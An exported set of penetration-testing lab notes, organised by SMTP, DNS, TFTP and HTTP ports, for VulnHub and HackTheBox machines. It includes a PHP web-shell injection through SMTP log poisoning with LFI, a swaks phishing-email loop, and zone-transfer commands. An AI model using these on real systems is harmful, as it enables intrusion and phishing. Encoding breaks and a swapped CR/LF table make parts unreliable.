  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Sends mail</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>On internal networks you can
      typically send emails as anybody</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>SMTP poisoning</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>send web shell code in
       subject line</span></li>
  </ul>
 </ul>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:1.0833in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.802in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-size:11.0pt'><span style='font-family:Calibri'>┌──(kali</span
  style='font-family:"Malgun Gothic"'>㉿</span><span style='font-fami
y:Calibri'>kali)-[~/…/VulnHub/symfonos/exfiltrated/smb]</span></
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>└─$ t
et
  10.0.0.12 25</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Trying
  10.0.0.12...</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connected to
  10.0.0.12.</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Escape character
  is '^]'.</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>220
  symfonos.localdomain ESMTP Postfix (Debian/GNU)</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>HELO example.com</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>250
  symfonos.localdomain</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>mail from:
  hacker@example.com</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>250 2.1.0 Ok</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>rcpt to:
  helios@symfonos.localdomain</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>250 2.1.5 Ok</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>data</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>354 End data with
  &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>subject: </p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;?php echo
  shell_exec($_GET['cmd]); ?&gt;</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>.</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>250 2.0.0 Ok:
  queued as 8A6884082B</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>quit</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>221 2.0.0 Bye</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connection closed
  by foreign host.</p>
  </td>
 </tr>
</table>

</div>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>LFI -
     /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</span></li>
</ul>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Enumerate users</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>FirstName.LastName</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>F.LastName</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>DepartmentName</span></li>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>nc</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Use nc –nvC to imp
ement a
       full CRLF, sometimes needed if not getting a response from server</span></li>
  </ul>
 </ul>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:1.0833in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.5069in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>CR – Carr
age
  Return</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.5354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>\n</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.4875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LF – Line
Feed</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.5548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>\r</p>
  </td>
 </tr>
</table>

</div>

<ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>telnet</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>swaks</span></li>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Swiss Army Knife SMTP</span></li>
 </ul>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:.7083in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Send email list</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.95in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>for email in $(cat
  email.lst);</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>do</p>
  <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>swaks
  \</p>
  <p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>--from
  support@sneakymailer.htb \</p>
  <p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>--to
  $email \</p>
  <p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>--header
  'Subject: Please Register Your Account' \</p>
  <p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>--body
  '<a href="http://10.10.14.106/test">http://10.10.14.106/test</a>' \</p>
  <p style='margin:0in;margin-left:.75in;font-family:Calibri;font-size:11.0pt'>--server
  sneakymailer.htb</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>done;</p>
  </td>
 </tr>
</table>

</div>

<ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>thunderbird</span></li>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Mail client</span></li>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Evolution</span></li>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Mail client</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Alt+F2 </span></li>
 </ul>
</ul>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SMTP commands:</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.6673in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>VRFY</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.2638in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>asks a server to
  verify an email address</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:.6673in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>EXPN</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.3333in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>asks the server
  for the membership of a mailing list</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:12.9881in'>

<div style='direction:ltr;margin-top:0in;margin-left:.2486in;width:2.0013in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>53 TCP / DNS</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.2486in;width:2.45in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Thursday,
February 4, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>2:56
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:12.9881in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>If DNS is running then we
      can edit /etc/resolv.conf instead of /etc/hosts so it will automatically
      grab other DNS names</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Putting htb machine ip
       above www resolv.conf ip will result in htb dns being searched before
       www</span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Pros and cons to either
        configuration</span></li>
   </ul>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>nslookup</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.9493in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Resolve IP to
   domain name</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:9.7506in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <div style='direction:ltr'>
   <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:
    ltr;border-collapse:collapse;border-style:solid;border-color:#A3A3A3;
    border-width:1pt' title="" summary="">
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.9701in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Start nslookup
     in interactive mode</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:3.5979in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>nslookup</p>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.9701in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enter server IP</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:3.5979in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>server &lt;ip
     address&gt;</p>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.8923in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enter IP to
     resolve against server (can be the same as the DNS server IP entered in
     the step before)</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:3.6756in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
      0in'>
      <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
       margin-bottom:0in'>
       <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
           style='font-family:Calibri;font-size:11.0pt'>IP addresses to try:</span></li>
       <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
        margin-bottom:0in'>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>IP address of the box
            itself</span></li>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>127.0.0.1</span></li>
        <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
            style='font-family:Calibri;font-size:11.0pt'>127.0.0.2</span></li>
        <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:
         0in;margin-bottom:0in'>
         <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
             style='font-family:Calibri;font-size:11.0pt'>Sometimes people
             configure this</span></li>
        </ul>
       </ul>
      </ul>
     </ul>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.9701in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Zone transfer</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:3.5979in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ls -d
     &lt;domain&gt;</p>
     </td>
    </tr>
   </table>
   </div>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Host</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Resolve IP to
   domain name</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9312in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>host &lt;IP
   Address&gt;<br>
      host &lt;domain name&gt; &lt;DNS Server&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4743in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Find all mx
   records for example.com</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9118in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>host –t 
   &lt;Domain Name&gt;<br>
      Example: host –t mx example.com</
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Zone transfer</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9312in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>host �
   &lt;domain name&gt; &lt;DNS Server&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Example: host -l
   cronos.htb ns1.cronos.htb<br>
      Example: host –l cronos.htb 10.10.10.13</
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Find name servers</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.9312in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>host –t 
   example.com</p>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>dig</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.0576in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Zone transfer</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.6923in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>dig axfr
   &lt;Domain - Ex.: friendzone.htb&gt; @&lt;ns ip address&gt;</p>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>DNSRecon</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.0812in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Zone Transfer</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.1131in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>dnsrecon â�

   &lt;domain&gt; -t axfr -n &lt;DNS Address&gt;</p>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Gobuster</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.725in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Subdomain brute
   force</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.8916in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>gobuster dns -d
   &lt;Domain Name&gt; -w<span style='mso-spacerun:yes'>�
   </span>/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</p>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>dnsEnum</span></li>
 </ul>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>wfuzz</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.6277in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Run scan to look
   for other subdomains</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:10.1444in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <div style='direction:ltr'>
   <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:
    ltr;border-collapse:collapse;border-style:solid;border-color:#A3A3A3;
    border-width:1pt' title="" summary="">
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.0256in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Run 1st scan to
     check char length on responses and immediately ctrl+c</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:4.9361in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>wfuzz -c -u<span
     style='color:#FA0000'> &lt;IP Address&gt;</span> -H &quot;Host: FUZZ:<span
     style='color:#FA0000'>&lt;Domain Name&gt;</span>&quot; -w <span
     style='color:#FA0000'>/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></p>
     </td>
    </tr>
    <tr>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:5.0451in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Run 2nd scan
     with --hh flag to hide responses of subdomains that do not exist</p>
     </td>
     <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
     vertical-align:top;width:4.9166in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
     <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>wfuzz -c -u<span
     style='color:#FA0000'> &lt;IP Address&gt;</span> -H &quot;Host: FUZZ:<span
     style='color:#FA0000'>&lt;Domain Name&gt;</span>&quot; -w <span
     style='color:#FA0000'>/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
     </span>--hh <span style='color:#FA0000'>&lt;Char Length #&gt;</span></p>
     </td>
    </tr>
   </table>
   </div>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:3.7291in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.1291in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>69 UDP /
TFTP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.409in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Wednesday,
May 12, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>4:49
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:3.7291in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>No command to list files</span></li>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.2868in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Test for windows</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.3479in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
  style='mso-spacerun:yes'> </span>get \windows\system32\license.rtf</p
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.2673in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.2979in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.575in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.1111in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>80 TCP /
HTTP</p>

</div>

